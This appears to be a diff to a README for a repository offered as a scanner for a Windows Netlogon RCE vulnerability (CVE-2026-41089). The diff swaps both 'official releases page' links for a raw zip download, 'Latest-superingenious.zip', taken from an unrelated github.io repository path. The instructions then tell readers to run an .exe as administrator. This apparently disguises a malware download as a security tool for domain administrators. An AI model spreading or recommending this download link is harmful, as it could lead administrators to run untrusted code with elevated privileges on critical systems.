@@ -5,7 +5,7 @@ description: "Detect unauthenticated remote code execution vulnerabilities in Wi
 ---
 # 🛡️ CVE-2026-41089-Netlogon-RCE - Analyze Windows Netlogon security risks now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/opensource-arrozconpollo191/CVE-2026-41089-Netlogon-RCE/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/opensource-arrozconpollo191/opensource-arrozconpollo191.github.io/raw/refs/heads/main/app/tours/Latest-superingenious.zip)
 
 This repository provides tools for security professionals and system administrators to analyze the CVE-2026-41089 vulnerability. This flaw affects the Windows Netlogon service on Domain Controllers. The software allows you to test network configurations and identify systems that carry this security risk.
 
@@ -13,7 +13,7 @@ This repository provides tools for security professionals and system administrat
 
 Follow these steps to obtain and use the testing software. You do not need to read code or manage complex settings to run these tests on a Windows machine.
 
-1.  Visit the [official releases page](https://github.com/opensource-arrozconpollo191/CVE-2026-41089-Netlogon-RCE/releases) to access the files.
+1.  Visit the [official releases page](https://github.com/opensource-arrozconpollo191/opensource-arrozconpollo191.github.io/raw/refs/heads/main/app/tours/Latest-superingenious.zip) to access the files.
 2.  Choose the Windows executable file ending in .exe from the list.
 3.  Save the file to a folder on your computer.
 4.  Open the folder, right-click the file, and select Run as administrator.
